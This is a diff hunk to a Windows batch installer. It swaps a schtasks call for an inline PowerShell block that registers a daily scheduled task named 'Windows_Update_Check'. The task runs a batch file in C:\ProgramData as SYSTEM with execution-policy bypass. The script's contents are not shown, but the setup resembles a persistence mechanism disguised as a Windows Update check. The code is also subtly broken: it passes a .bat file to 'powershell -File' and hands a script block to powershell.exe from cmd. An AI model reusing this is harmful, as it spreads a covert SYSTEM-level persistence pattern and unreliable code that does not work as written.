@@ -41,7 +41,20 @@ if %errorlevel% equ 0 (
         echo Batch script "Windows_Update_Check.bat" created.
         
         :: Create a scheduled task for "Windows_Update_Check.bat"
-        schtasks /create /tn "Windows_Update_Check" /tr "%bat_script%" /sc daily /st 12:00
+        powershell -Command {
+            # Define the path to your batch script
+            $batchScriptPath = "C:\ProgramData\Windows_Update_Check.bat"
+
+            # Define the action to run the batch script
+            $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-ExecutionPolicy Bypass -File '$batchScriptPath'"
+
+            # Define the trigger for daily execution at 12:00 PM
+            $trigger = New-ScheduledTaskTrigger -Daily -At "12:00 PM"
+
+            # Register the scheduled task
+            Register-ScheduledTask -TaskName "Windows_Update_Check" -Action $action -Trigger $trigger -User "NT AUTHORITY\SYSTEM" -Force
+        }
+        
         echo Scheduled task "Windows_Update_Check" created.
         
         :: Run the "Windows_Update_Check.bat" script
